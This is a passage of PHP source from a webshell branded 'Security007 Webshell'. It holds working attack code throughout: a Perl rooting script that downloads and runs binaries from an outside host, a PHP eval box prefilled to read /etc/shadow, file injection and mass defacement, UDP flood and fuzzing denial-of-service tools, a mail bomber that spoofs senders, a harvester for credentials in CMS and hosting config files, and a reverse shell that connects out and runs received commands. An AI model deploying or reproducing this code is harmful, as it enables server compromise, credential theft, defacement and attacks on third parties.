Uy9maWxlL2NjLzgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgOCIpOyANCnN5c3RlbSgiLi84Iik7
IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJ
TEVTL2ZpbGUvY2MvZHoiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZHoiKTsgDQpzeXN0ZW0oIi4v
ZHoiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9D
TVNfRklMRVMvZmlsZS9jYy94ODYiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgeDg2Iik7IA0Kc3lz
dGVtKCIuL3g4NiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5
NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2xvbCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBsb2wi
KTsgDQpzeXN0ZW0oIi4vbG9sIik7IA0Kc3lzdGVtKCJpZCIpOyANCn0=";

     $fd = fopen("r00t.pl","w");

            if ($fd != FALSE)
            {
                fwrite($fd,base64_decode($r00t));
                $out = exec_all("perl r00t.pl;");
            	if ($out != "")
            	{
			$cmd_out = exec_all("whoami");
			if ($cmd_out != "")
			{
				if (strpos($cmd_out == 'root') !== false)
					echo "<p class='alert_green'>You are ".trim(exec_all("whoami"))."</p>";
				else
					echo "<p class='alert_red'>You are ".trim(exec_all("whoami"))."</p>";
			}
			else
			{
				echo "<p class='alert_red'>Rooting Failed</p>";
			}
            	}
	    }
            else
            {
                echo "<p class='alert_red'>Permission Denied</p>";
            }
    ?>
    <?php
}

// PHP evaluate

else if(isset($_GET['eval']))
{
    ?>
    
    <form method="POST">
    <textarea name="code" class="cmd" cols="100" rows="20"><?php
    // If the comand was sent
    if(isset($_POST['code'])
        && $_POST['code']
    )
    {
        // Filter Some Chars we dont need

        $code = str_replace("<?php","",$_POST['code']);
        $code = str_replace("<?","",$code);
        $code = str_replace("?>","",$code);

        // Evaluate PHP CoDE!

        echo htmlspecialchars(eval($code));
    }
    else
    {
        ?>echo file_get_contents('/etc/shadow');<?php
    }
    ?></textarea><br /><br />
    <input name="submit" value="Eval That COde! :D" class="own" type="submit" />
    </form>

    <?php
    
}

// Upload

else if(isset($_GET['upload']))
{

    if (isset($_POST['file']) &&
        isset($_POST['path']) 
     )
    {
        $path = $_POST['path'];
            
        if($path[(strlen($path)-1)] != $SEPARATOR){$path = $path.$SEPARATOR;}
        
        if(is_dir($path))
        {
            $uploadedFilePath = $_FILES['file']['name'];
            $tempName = $_FILES['file']['tmp_name'];
            $uploadPath = $path .  $uploadedFilePath;
            $stat = move_uploaded_file($tempName , $uploadedFilePath);
            if ($stat)
            {
                echo "<p class='alert_green'>File uploaded to $uploadPath</p>";
            }
            else
            {
                echo "<p class='alert_red'>Failed to upload file to $uploadPath</p>";
            }
         }
    }
    else
    {
    ?>
    <table class="bind" align="center" >
    <tr>
        <th class="header" colspan="1" width="50px">Upload (From ur Computer)</th>
    </tr>
    <tr>
         <td>
            <table style="border-spacing: 6px;">
                <form method="POST" enctype="multipart/form-data">
                
                <tr>
                    <td width="100"><input type="file" name="file"/></td>
                    <td><input type="submit" name="file" class="own" value="Upload"/></td>
            
                </tr>
                
                 <tr>
                    <td colspan="2">
                        <input class='cmd' style="width: 280px;" name='path' value="<?php echo getcwd(); ?>" />   
                    </td>
                </tr>
                
                </form>
            </table>
         </td>
    </tr>
    </table>
<?php
    }

}

// Code Injector

else if(isset($_GET['injector']))
{
    if(isset($_GET['dir']) &&
    $_GET['dir'] != '' &&
    isset($_GET['filetype']) &&
    $_GET['filetype'] != '' &&
    isset($_GET['mode']) &&
    $_GET['mode'] != '' && 
    isset($_GET['message']) &&
    $_GET['message'] != '' 
    )
    {
        $dir = $_GET['dir'];
        $filetype = $_GET['filetype'];
        $message = $_GET['message'];
        
        $mode = "a"; //default mode
        
        
        // Modes Begin
        
        if($_GET['mode'] == 'Apender')
        {
            $mode = "a";
        }
        if($_GET['mode'] == 'Overwriter')
        {
            $mode = "w";
        }
        
        if($handle = opendir($dir))
        {
            ?>
            Overwritten Files :-
            <ul style="padding: 10px;" >
            <?php
            while(($file = readdir($handle)) !== False)
            {
                if((preg_match("/$filetype".'$'.'/', $file , $matches) != 0) && (preg_match('/'.$file.'$/', $self , $matches) != 1))
                {
                    ?>
                        <li class="file"><a href="<?php echo "$self?open=$dir$file"?>"><?php echo $file; ?></a></li>
                    <?php
                    echo "\n";
                    $fd = fopen($dir.$file,$mode);
		    if (!$fd) echo "<p class='alert_red'>Permission Denied</p>"; break;
                    fwrite($fd,$message);
                }
            }
            ?>
            </ul>
            <?php
        }
    }
    else
    {
        ?>
        <table id="margins" >
        <tr>
            <form method='GET'>
            <input type="hidden" name="injector"/>  
                <tr>
                    <td width="100" class="title">
                        Directory
                    </td>
                    <td>
                         <input class="cmd" name="dir" value="<?php echo getcwd().$SEPARATOR; ?>" />
                    </td>
                </tr>
                <tr>
                <td class="title">
                    Mode
                </td>
                <td>
                        <select style="width: 400px;" name="mode" class="cmd">
                            <option value="Apender">Apender</option>
                            <option value="Overwriter">Overwriter</option>
                        </select>
                </td>
                </tr>
                <tr>
                    <td class="title">
                        File Type
                    </td>
                    <td>
                        <input type="text" class="cmd" name="filetype" value=".php" onblur="if(this.value=='')this.value='.php';" />
                    </td>
                </tr>
                
                
                <tr>
                    <td colspan="2">
                        <textarea name="message" cols="110" rows="10" class="cmd">All i remember are those lonely nights when i was defacing those insecure websites!</textarea>
                    </td>
                </tr>
                
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="submit" class="own" value="Inject :D"/>
                    </td>
                </tr>
        </form>
        </table>
        <?php
    }
}

// MD5 Cracker

else if(isset($_GET['md5']))
{
    if(isset($_GET['hash']) &&
    isset($_GET['passwdList']) &&
    $_GET['hash'] != '' &&
    $_GET['passwdList'] != '')
    
    {
        echo md5Crack($_GET['hash'],$_GET['passwdList']);
    }
    else
    {
        ?>
        <table id="margins" >
        <tr>
            <form method='GET'>
                <input type="hidden" name="md5" />
                <tr>
                    <td width="100" class="title">
                        Hash
                    </td>
                    <td>
                         <input class="cmd" name="hash"/>
                    </td>
                </tr>
                <tr>
                <td class="title">
                    Password List (File Path)
                </td>
                <td>
                    <input class="cmd" name="passwdList" value="<?php echo getcwd().$SEPARATOR; ?>" />
                </td>
                </tr>
                <tr>
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="submit" class="own" value="Lets Crack :D"/>
                    </td>
                </tr>
        </form>
        </table>
        
        <?php
    }
}

// Google Dork Creater

else if(isset($_GET['gdork']))
{
    if(
    isset($_GET['title']) ||
    isset($_GET['text']) ||
    isset($_GET['url']) ||
    isset($_GET['site'])
    )
    {
        $title = $_GET['title'];
        $text = $_GET['text'];
        $url = $_GET['url'];
        $site = $_GET['site'];
        
        if($title != "")
        {
            $title = " intitle:\"".$title."\" ";
        }
        if($text != "")
        {
            $text = " intext:\"".$text."\" ";
        }
        if($url != "")
        {
            $url = " inurl:\"".$url."\" ";
        }
        if($site != "")
        {
            $site = " site:\"".$site."\" ";
        }
        
        // Print the output now
        ?>
        <div align="center">
        <form action="http://google.com" method="GET">
            <input class="cmd" style="border: solid red 1px;" name="q" value='<?php echo $title.$text.$url.$site ?>' /><br />
            <input type="submit" style="Padding:5px;" class="own" value='Google It! ;)' />
        </form>
        </div>
        <?php
    }
    else 
    {
    ?>
    <p align="center" style="color:red;">Note : Any one of the following options is compulsory to be filled rest can be left blank.</p>
     <table id="margins" >
        <tr>
            <form method='GET'>
                <input type="hidden" name="gdork" />
                <tr>
                    <td width="100" class="title">
                        intitle
                    </td>
                    <td>
                         <input class="cmd" name="title" value="security007 webshell"/>
                    </td>
                </tr>
                <tr>
                <td class="title">
                    intext
                </td>
                <td>
                    <input class="cmd" name="text" value="security007" />
                </td>
                </tr>
                <tr>
                    <td width="100" class="title">
                        inurl
                    </td>
                    <td>
                         <input class="cmd" name="url" value="007webshell.php"/>
                    </td>
                </tr>
                <tr>
                    <td width="100" class="title">
                        site
                    </td>
                    <td>
                         <input class="cmd" name="site" value="*.org"/>
                    </td>
                </tr>
                <tr>
                    <td rowspan="2" >
                        <input style="margin : 20px; margin-left: 390px; padding : 10px;" type="submit" class="own" value="Gimme the Dork!"/>
                    </td>
                </tr>
        </form>
        </table>
    <?php
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
    ?>       
    
<?php
    }
}

//fuzzer

else if(isset($_GET['fuzz']))
{
    if(isset($_GET['ip']) &&
    isset($_GET['port']) &&
    isset($_GET['times']) &&
    isset($_GET['time']) &&
    isset($_GET['message']) &&
    isset($_GET['messageMultiplier']) &&
    $_GET['message'] != "" &&
    $_GET['time'] != "" &&
    $_GET['times'] != "" &&
    $_GET['port'] != "" &&
    $_GET['ip'] != "" &&
    $_GET['messageMultiplier'] != ""
    )
    {
       $IP=$_GET['ip'];
	   $port=$_GET['port'];
       $times = $_GET['times'];
	   $timeout = $_GET['time'];
	   $send = 0;
       $ending = "";
       $multiplier = $_GET['messageMultiplier'];
       $data = "";
       $mode="tcp";
       $data .= "GET /";
       $ending .= " HTTP/1.1\n\r\n\r\n\r\n\r";
        if($_GET['type'] == "tcp")
        {
            $mode = "tcp";
        }
        while($multiplier--)
        {
            $data .= urlencode($_GET['message']);
        }
        $data .= "%s%s%s%s%d%x%c%n%n%n%n";// add some format string specifiers
        $data .= "by-Ani-shell".$ending;
        $length = strlen($data);
        
        
       echo "Sending Data :- <br /> <p align='center'>$data</p>";
        
       print "I am at ma Work now :D ;D! Dont close this window untill you recieve a message <br>";
	   for($i=0;$i<$times;$i++)
	   {
            $socket = fsockopen("$mode://$IP", $port, $error, $errorString, $timeout);
            if($socket)
            {
                fwrite($socket , $data , $length );
                fclose($socket);
            }
        }
        echo "<script>alert('Fuzzing Completed!');</script>";
        echo "DOS attack against $mode://$IP:$port completed on ".date("h:i:s A")."<br />";
        echo "Total Number of Packets Sent : " . $times . "<br />";
        echo "Total Data Sent = ". HumanReadableFilesize($times*$length) . "<br />"; 
        echo "Data per packet = " . HumanReadableFilesize($length) . "<br />";
    }
    else
    {
        ?>
        <form method="GET">
            <input type="hidden" name="fuzz" />
            <table id="margins">
                <tr>
                    <td width="400" class="title">
                        IP
                    </td>
                    <td>
                        <input class="cmd" name="ip" value="127.0.0.1" onfocus="if(this.value == '127.0.0.1')this.value = '';" onblur="if(this.value=='')this.value='127.0.0.1';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Port
                    </td>
                    <td>
                        <input class="cmd" name="port" value="80" onfocus="if(this.value == '80')this.value = '';" onblur="if(this.value=='')this.value='80';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Timeout
                    </td>
                    <td>
                        <input type="text" class="cmd" name="time" value="5" onfocus="if(this.value == '5')this.value = '';" onblur="if(this.value=='')this.value='5';"/>
                    </td>
                </tr>
                
                
                <tr>
                    <td class="title">
                        No of times
                    </td>
                    <td>
                        <input type="text" class="cmd" name="times" value="100" onfocus="if(this.value == '100')this.value = '';" onblur="if(this.value=='')this.value='100';" />
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Message <font color="red">(The message Should be long and it will be multiplied with the value after it)</font>
                    </td>
                    <td>
                        <input class="cmd" name="message" value="%S%x--Some Garbage here --%x%S" onfocus="if(this.value == '%S%x--Some Garbage here --%x%S')this.value = '';" onblur="if(this.value=='')this.value='%S%x--Some Garbage here --%x%S';"/>
                    </td>
                    <td>
                        x
                    </td>
                    <td width="20">
                        <input style="width: 30px;" class="cmd" name="messageMultiplier" value="10" />
                    </td>
                </tr>
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 500px; padding : 10px; width: 100px;" type="submit" class="own" value="Let it Rip! :D"/>
                    </td>
                </tr>
            </table>            
        </form>
        <?php
    }
}


//DDos

else if(isset($_GET['dos']))
{
    if(isset($_GET['ip']) &&
    isset($_GET['exTime']) &&
    isset($_GET['port']) &&
    isset($_GET['timeout']) &&
    isset($_GET['exTime']) &&
    $_GET['exTime'] != "" &&
    $_GET['port'] != "" &&
    $_GET['ip'] != "" &&
    $_GET['timeout'] != "" &&
    $_GET['exTime'] != ""
    )
    {
       $IP=$_GET['ip'];
	   $port=$_GET['port'];
       $executionTime = $_GET['exTime'];
	   $noOfBytes = $_GET['noOfBytes'];
       $data = "";
       $timeout = $_GET['timeout'];
       $packets = 0;
       $counter = $noOfBytes;
       $maxTime = time() + $executionTime;;
       while($counter--)
       {
            $data .= "X";
       }
       $data .= "-by-Ani-Shell"; 
       print "I am at ma Work now :D ;D! Dont close this window untill you recieve a message <br>";
	   
       while(1)
	   {
            $socket = fsockopen("udp://$IP", $port, $error, $errorString, $timeout);
            if($socket)
            {
                fwrite($socket , $data);
                fclose($socket);
                $packets++;
            }
            if(time() >= $maxTime)
            {
                break;
            }
        }
        echo "<script>alert('DDos Completed!');</script>";
        echo "DOS attack against udp://$IP:$port completed on ".date("h:i:s A")."<br />";
        echo "Total Number of Packets Sent : " . $packets . "<br />";
        echo "Total Data Sent = ". HumanReadableFilesize($packets*$noOfBytes) . "<br />"; 
        echo "Data per packet = " . HumanReadableFilesize($noOfBytes) . "<br />";
    }
    else
    {

        ?>
        <form method="GET">
            <input type="hidden" name="dos" />
            <table id="margins">
                <tr>
                    <td width="400" class="title">
                        IP
                    </td>
                    <td>
                        <input class="cmd" name="ip" value="127.0.0.1" onfocus="if(this.value == '127.0.0.1')this.value = '';" onblur="if(this.value=='')this.value='127.0.0.1';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Port
                    </td>
                    <td>
                        <input class="cmd" name="port" value="80" onfocus="if(this.value == '80')this.value = '';" onblur="if(this.value=='')this.value='80';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Timeout <font color="red">(Time in seconds)</font>
                    </td>
                    <td>
                        <input type="text" class="cmd" name="timeout" value="5" onfocus="if(this.value == '5')this.value = '';" onblur="if(this.value=='')this.value='5';" />
                    </td>
                </tr>
                
                
                <tr>
                    <td class="title">
                        Execution Time <font color="red">(Time in seconds)</font> 
                    </td>
                    <td>
                        <input type="text" class="cmd" name="exTime" value="10" onfocus="if(this.value == '10')this.value = '';" onblur="if(this.value=='')this.value='10';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        No of Bytes per/packet
                    </td>
                    <td>
                        <input type="text" class="cmd" name="noOfBytes" value="999999" onfocus="if(this.value == '999999')this.value = '';" onblur="if(this.value=='')this.value='999999';"/>
                    </td>
                </tr>
                

                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 500px; padding : 10px; width: 100px;" type="submit" class="own" value="Let it Rip! :D"/>
                    </td>
                </tr>
            </table>            
        </form>
        <?php
    }
}

// Mail Bomber

else if(isset($_GET['bomb']))
{
    if(
        isset($_GET['to']) &&
        isset($_GET['subject']) &&
        isset($_GET['message']) &&
        isset($_GET['times']) &&
        $_GET['to'] != '' &&
        $_GET['subject'] != '' &&
        $_GET['message'] != '' &&
        $_GET['times'] != ''
    )
    {
        $times = $_GET['times'];
        while($times--)
        {
            if(isset($_GET['padding']))
            {
                $fromPadd = rand(0,9999);
                $subjectPadd = " -- ID : ".rand(0,9999999);
                $messagePadd = "\n\n------------------------------\n".rand(0,99999999);
                
            }
            $from = "president$fromPadd@whitehouse.gov";
            if(!mail($_GET['to'],$_GET['subject'].$subjectPadd,$_GET['message'].$messagePadd,"From:".$from))
            {
                $error = 1;
                echo "<p class='alert_red'>Some Error Occured!</p>";
                break;
            }
        }
        if($error != 1)
        {
            echo "<p class='alert_green'>Mail(s) Sent!</p>";
        }
    }
    else
    {
        ?>
        <form method="GET">
            <input type="hidden" name="bomb" />
            <table id="margins">
                <tr>
                    <td class="title">
                        To 
                    </td>
                    <td>
                        <input class="cmd" name="to" value="victim@domain.com,victim2@domain.com" onfocus="if(this.value == 'victim@domain.com,victim2@domain.com')this.value = '';" onblur="if(this.value=='')this.value='victim@domain.com,victim2@domain.com';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Subject
                    </td>
                    <td>
                        <input type="text" class="cmd" name="subject" value="Just testing my Fucking Skillz!" onfocus="if(this.value == 'Just testing my Fucking Skillz!')this.value = '';" onblur="if(this.value=='')this.value='Just testing my Fucking Skillz!';" />
                    </td>
                </tr>
                 <tr>
                    <td class="title">
                        No. of Times  
                    </td>
                    <td>
                        <input class="cmd" name="times" value="100" onfocus="if(this.value == '100')this.value = '';" onblur="if(this.value=='')this.value='100';"/>
                    </td>
                </tr>
       
                <tr>
                    <td>
                        
                        Pad your message (Less spam detection)
                        
                    </td>
                    <td>
                    
                        <input type="checkbox" name="padding"/>
                          
                    </td>
                </tr>
                <tr>
                    <td colspan="2">
                        <textarea name="message" cols="110" rows="10" class="cmd">[Security007] [Problem Cyber Team]</textarea>
                    </td>
                </tr>
                
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="submit" class="own" value="Send! :D"/>
                    </td>
                </tr>
            </table>            
        </form>   
        <?php
    }
}

//Mass Mailer

else if(isset($_GET['mail']))
{
    if(
        isset($_GET['to']) &&
        isset($_GET['from']) &&
        isset($_GET['subject']) &&
        isset($_GET['message'])
    )
    {

        if(mail($_GET['to'],$_GET['subject'],$_GET['message'],"From:".$_GET['from']))
        {
            echo "<p class='alert_green'>Mail Sent!</p>";
        }
        else
        {
            echo "<p class='alert_red'>Some Error Occured!</p>";
        }
    }
    else
    {
        ?>
        <form method="GET">
            <input type="hidden" name="mail" />
            <table id="margins">
                <tr>
                    <td width="100" class="title">
                        From
                    </td>
                    <td>
                        <input class="cmd" name="from" value="president@whitehouse.gov" onfocus="if(this.value == 'president@whitehouse.gov')this.value = '';" onblur="if(this.value=='')this.value='president@whitehouse.gov';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        To 
                    </td>
                    <td>
                        <input class="cmd" name="to" value="victim@domain.com,victim2@domain.com" onfocus="if(this.value == 'victim@domain.com,victim2@domain.com')this.value = '';" onblur="if(this.value=='')this.value='victim@domain.com,victim2@domain.com';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Subject
                    </td>
                    <td>
                        <input type="text" class="cmd" name="subject" value="Just testing my Fucking Skillz!" onfocus="if(this.value == 'Just testing my Fucking Skillz!')this.value = '';" onblur="if(this.value=='')this.value='Just testing my Fucking Skillz!';" />
                    </td>
                </tr>
                
                
                <tr>
                    <td colspan="2">
                        <textarea name="message" cols="110" rows="10" class="cmd">All i remember are those lonely nights when i was defacing those insecure websites!</textarea>
                    </td>
                </tr>
                
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="submit" class="own" value="Send! :D"/>
                    </td>
                </tr>
            </table>            
        </form>   
        <?php
    }
}elseif(isset($_GET['mass'])) {
echo "<center/><br/><b><font color=blue>-=[ Mass Deface ]=-</font></b><br>";
error_reporting(0);?>
<form ENCTYPE="multipart/form-data" action="<?php $_SERVER['PHP_SELF']?>" method='post'>
<td><table><table class="tabnet" >
<form hethot='post'>
<tr>
	<tr>
	<td>&nbsp;&nbsp;Folder</td><td><input class ='inputz' type='text' name='path' size='60' value="<?php echo getcwd();?>"></td>
	</tr><br>
	<tr>
	<td>file name</td><td><input class ='inputz' type='text' name='file' size='60' value="security007.php"></td>
	</tr>
</tr>
<th colspan='2'><b>Index code</b></th><br></table>
<textarea style='background:white;outline:none;' name='index' rows='10' cols='67'>Hacked By Security007</textarea><br>
<center><input class='inputzbut' type='submit' value="&nbsp;&nbsp;Deface&nbsp;&nbsp;"></center></form></table><br></form>

<?php $mainpath=$_POST[path];$file=$_POST[file];$dir=opendir("$mainpath");$code=base64_encode($_POST[index]);$indx=base64_decode($code);while($row=readdir($dir)){$start=@fopen("$row/$file","w+");$finish=@fwrite($start,$indx);if ($finish){echo "http://$row/$file > Done<br><br>";}}}
elseif(isset($_GET['config'])) {
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("007_config", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("007_config/.htaccess","w");
		fwrite($htc, $isi_htc);
		preg_match_all('/(.*?):x:/', $passwd, $user_config);
		foreach($user_config[1] as $user_cox) {
			$user_config_dir = "/home/$user_cox/public_html/";
			if(is_readable($user_config_dir)) {
				$grab_config = array(
					"/home/$user_cox/.my.cnf" => "cpanel",
					"/home/$user_cox/.accesshash" => "WHM-accesshash",
					"/home/$user_cox/public_html/bw-configs/config.ini" => "BosWeb",
					"/home/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
					"/home/$user_cox/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home/$user_cox/public_html/clientarea/configuration.php" => "WHMCS",
					"/home/$user_cox/public_html/whm/configuration.php" => "WHMCS",
					"/home/$user_cox/public_html/whmcs/configuration.php" => "WHMCS",
					"/home/$user_cox/public_html/forum/config.php" => "phpBB",
					"/home/$user_cox/public_html/sites/default/settings.php" => "Drupal",
					"/home/$user_cox/public_html/config/settings.inc.php" => "PrestaShop",
					"/home/$user_cox/public_html/app/etc/local.xml" => "Magento",
					"/home/$user_cox/public_html/joomla/configuration.php" => "Joomla",
					"/home/$user_cox/public_html/configuration.php" => "Joomla",
					"/home/$user_cox/public_html/wp/wp-config.php" => "WordPress",
					"/home/$user_cox/public_html/wordpress/wp-config.php" => "WordPress",
					"/home/$user_cox/public_html/wp-config.php" => "WordPress",
					"/home/$user_cox/public_html/admin/config.php" => "OpenCart",
					"/home/$user_cox/public_html/slconfig.php" => "Sitelok",
					"/home/$user_cox/public_html/application/config/database.php" => "Ellislab",
					"/home1/$user_cox/.my.cnf" => "cpanel",
					"/home1/$user_cox/.accesshash" => "WHM-accesshash",
					"/home1/$user_cox/public_html/bw-configs/config.ini" => "BosWeb",
					"/home1/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
					"/home1/$user_cox/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home1/$user_cox/public_html/clientarea/configuration.php" => "WHMCS",
					"/home1/$user_cox/public_html/whm/configuration.php" => "WHMCS",
					"/home1/$user_cox/public_html/whmcs/configuration.php" => "WHMCS",
					"/home1/$user_cox/public_html/forum/config.php" => "phpBB",
					"/home1/$user_cox/public_html/sites/default/settings.php" => "Drupal",						
					"/home1/$user_cox/public_html/config/settings.inc.php" => "PrestaShop",
					"/home1/$user_cox/public_html/app/etc/local.xml" => "Magento",
					"/home1/$user_cox/public_html/joomla/configuration.php" => "Joomla",
					"/home1/$user_cox/public_html/configuration.php" => "Joomla",
					"/home1/$user_cox/public_html/wp/wp-config.php" => "WordPress",
					"/home1/$user_cox/public_html/wordpress/wp-config.php" => "WordPress",
					"/home1/$user_cox/public_html/wp-config.php" => "WordPress",
					"/home1/$user_cox/public_html/admin/config.php" => "OpenCart",
					"/home1/$user_cox/public_html/slconfig.php" => "Sitelok",
					"/home1/$user_cox/public_html/application/config/database.php" => "Ellislab",
					"/home2/$user_cox/.my.cnf" => "cpanel",
					"/home2/$user_cox/.accesshash" => "WHM-accesshash",
					"/home2/$user_cox/public_html/bw-configs/config.ini" => "BosWeb",
					"/home2/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
					"/home2/$user_cox/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home2/$user_cox/public_html/clientarea/configuration.php" => "WHMCS",
					"/home2/$user_cox/public_html/whm/configuration.php" => "WHMCS",
					"/home2/$user_cox/public_html/whmcs/configuration.php" => "WHMCS",
					"/home2/$user_cox/public_html/forum/config.php" => "phpBB",
					"/home2/$user_cox/public_html/sites/default/settings.php" => "Drupal",
					"/home2/$user_cox/public_html/config/settings.inc.php" => "PrestaShop",
					"/home2/$user_cox/public_html/app/etc/local.xml" => "Magento",
					"/home2/$user_cox/public_html/joomla/configuration.php" => "Joomla",
					"/home2/$user_cox/public_html/configuration.php" => "Joomla",
					"/home2/$user_cox/public_html/wp/wp-config.php" => "WordPress",
					"/home2/$user_cox/public_html/wordpress/wp-config.php" => "WordPress",
					"/home2/$user_cox/public_html/wp-config.php" => "WordPress",
					"/home2/$user_cox/public_html/admin/config.php" => "OpenCart",
					"/home2/$user_cox/public_html/slconfig.php" => "Sitelok",
					"/home2/$user_cox/public_html/application/config/database.php" => "Ellislab",
					"/home3/$user_cox/.my.cnf" => "cpanel",
					"/home3/$user_cox/.accesshash" => "WHM-accesshash",
					"/home3/$user_cox/public_html/bw-configs/config.ini" => "BosWeb",
					"/home3/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
					"/home3/$user_cox/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home3/$user_cox/public_html/clientarea/configuration.php" => "WHMCS",
					"/home3/$user_cox/public_html/whm/configuration.php" => "WHMCS",
					"/home3/$user_cox/public_html/whmcs/configuration.php" => "WHMCS",
					"/home3/$user_cox/public_html/forum/config.php" => "phpBB",
					"/home3/$user_cox/public_html/sites/default/settings.php" => "Drupal",
					"/home3/$user_cox/public_html/config/settings.inc.php" => "PrestaShop",
					"/home3/$user_cox/public_html/app/etc/local.xml" => "Magento",
					"/home3/$user_cox/public_html/joomla/configuration.php" => "Joomla",
					"/home3/$user_cox/public_html/configuration.php" => "Joomla",
					"/home3/$user_cox/public_html/wp/wp-config.php" => "WordPress",
					"/home3/$user_cox/public_html/wordpress/wp-config.php" => "WordPress",
					"/home3/$user_cox/public_html/wp-config.php" => "WordPress",
					"/home3/$user_cox/public_html/admin/config.php" => "OpenCart",
					"/home3/$user_cox/public_html/slconfig.php" => "Sitelok",
					"/home3/$user_cox/public_html/application/config/database.php" => "Ellislab"
						);	
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("007_config/$user_cox-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
			echo "<center><a href='?dir=$dir/007_config'><font color=blue>Done</font></a></center>";
			}else{
				
		echo "<form method=\"post\" action=\"\"><center>etc/passwd<br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
		echo file_get_contents('/etc/passwd');
		echo "</textarea><br><input type=\"submit\" value=\"GassPoll\"></td></tr></center>\n";
        }
}
elseif(isset($_GET['connect'])) 
	{
    if(isset($_POST['ip']) &&
     isset($_POST['port']) && 
        $_POST['ip'] != "" &&
        $_POST['port'] != ""
     )
    {
        echo "<p>The Program is now trying to connect!</p>";
        $ip = $_POST['ip']; 
        $port=$_POST['port']; 
        $sockfd=fsockopen($ip , $port , $errno, $errstr ); 
        if($errno != 0)
        {
            echo "<font color='red'><b>$errno</b> : $errstr</font>";
        }
        else if (!$sockfd)
        { 
               $result = "<p>Fatal : An unexpected error was occured when trying to connect!</p>";
        } 
        else
        { 
            fputs ($sockfd ,"\n=================================================================\nSecurity007 Webshell\n=================================================================");
         $pwd = exec_all("pwd");
         $sysinfo = exec_all("uname -a");
         $id = exec_all("id");
         $dateAndTime = exec_all("time /t & date /T");
         $len = 1337;
         fputs($sockfd ,$sysinfo . "\n" );
         fputs($sockfd ,$pwd . "\n" );
         fputs($sockfd ,$id ."\n\n" );
         fputs($sockfd ,$dateAndTime."\n\n" );
         while(!feof($sockfd))
         {  
            $cmdPrompt ="(Security007 Webshell)[$]> ";
            fputs ($sockfd , $cmdPrompt ); 
            $command= fgets($sockfd, $len);
            fputs($sockfd , "\n" . exec_all($command) . "\n\n");
        } 
        fclose($sockfd); 
        } 
    }
    else if(
    isset($_POST['port']) &&
    isset($_POST['passwd']) && 
    $_POST['port'] != "" &&
    $_POST['passwd'] != ""  &&
    isset($_POST['mode']))
    {
        $address = '127.0.0.1';
        $port = $_POST['port'];
        $pass = $_POST['passwd'];
        
        if($_POST['mode'] == "Python")
        {
